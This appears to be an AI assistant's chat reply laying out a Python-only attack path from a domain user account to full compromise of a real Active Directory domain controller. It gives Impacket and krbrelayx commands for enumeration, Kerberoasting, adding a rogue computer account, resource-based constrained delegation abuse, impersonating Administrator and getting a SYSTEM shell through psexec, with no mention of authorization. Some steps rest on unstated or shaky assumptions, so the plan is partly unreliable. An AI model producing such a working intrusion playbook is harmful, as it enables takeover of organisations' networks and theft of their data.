Thanks for the clarification — let's go 100% Python-only, no PowerShell, no external binaries, no cracking, real-life AD, with domain user credentials, and the objective: gain full DC access.


---

Your Current Access

Domain user creds (e.g., user@domain.local / password)

Python executable (on Windows machine)

Can reach DC (verified via DNS or nltest)

No admin on local machine

No other tools (e.g., BloodHound, Rubeus, SharpHound) — only raw Python and possibly built-in Windows commands



---

Objective

Use Python to escalate from domain user to Domain Controller compromise using realistic attack paths like:

1. Kerberoasting (no cracking) — discover vulnerable service accounts


2. ACL / RBCD abuse (if write access to computer accounts is found)


3. S4U2Proxy + psexec-style shell using Impacket




---

Attack Plan: All Python-based

Step 1: Enumerate Domain and Users

# Tool: ldapdomaindump (Python-only)
pip install ldapdomaindump

python3 ldapdomaindump.py -u 'DOMAIN\\username' -p 'password' -d domain.local <DC-IP>

Review the output:

domain_users.json — get all usernames

domain_computers.json — look for SPNs and target systems

domain_groups.json — find groups with high privileges (e.g., Domain Admins)




---

Step 2: Kerberoasting (Get TGS without cracking)

# Tool: Impacket's GetUserSPNs.py
git clone https://github.com/fortra/impacket
cd impacket/examples

python3 GetUserSPNs.py domain.local/username:password -dc-ip <DC-IP> -outputfile kerberoast.txt

Look for service accounts (e.g., svc_sql, websvc, etc.)

Check if any are members of privileged groups (you’ll find this in domain_users.json)

You don't need to crack hashes, you're just looking for privileged accounts to target in lateral movement



---

Step 3: Dump SID, and Add Fake Computer (if possible)

Check if domain user can add a computer object (common misconfig):

# Tool: addcomputer.py from Impacket
python3 addcomputer.py -dc-ip <DC-IP> -computer-name FAKEPC -computer-pass 'Pass123!' domain.local/username:password

If successful, you now have a new computer object FAKEPC$ you control



---

Step 4: Abuse RBCD — Modify DC to Allow Delegation to FAKEPC$

Now grant FAKEPC delegation rights over the DC:

# Tool: rbcd.py from https://github.com/dirkjanm/krbrelayx
git clone https://github.com/dirkjanm/krbrelayx

python3 rbcd.py -u username -p 'password' -d domain.local -t DC01$ -s FAKEPC$ -dc-ip <DC-IP>

This sets up Resource-Based Constrained Delegation from DC to your controlled computer.



---

Step 5: Impersonate Domain Admin

# Tool: getST.py from Impacket
python3 getST.py -spn cifs/DC01.domain.local -impersonate Administrator domain.local/FAKEPC\$ -dc-ip <DC-IP> -hashes :<ntlm_of_FAKEPC>

This gives you a TGS ticket as Administrator



---

Step 6: Access the DC

# Tool: psexec.py (Python only, from Impacket)
python3 psexec.py -k -no-pass domain.local/Administrator@<DC-IP>

You're now SYSTEM on the DC.


---

Summary: Full DC Compromise With Only Python

Step	Tool (Python-only)	Command

Enum AD	ldapdomaindump	ldapdomaindump.py -u user -p pass
Kerberoast	GetUserSPNs.py	python3 GetUserSPNs.py domain/user:pass
Add computer	addcomputer.py	python3 addcomputer.py -dc-ip ...
Set RBCD	rbcd.py	python3 rbcd.py -u user ...
Forge TGS	getST.py	python3 getST.py -spn cifs/DC ...
Execute on DC	psexec.py	python3 psexec.py -k -no-pass ...



---
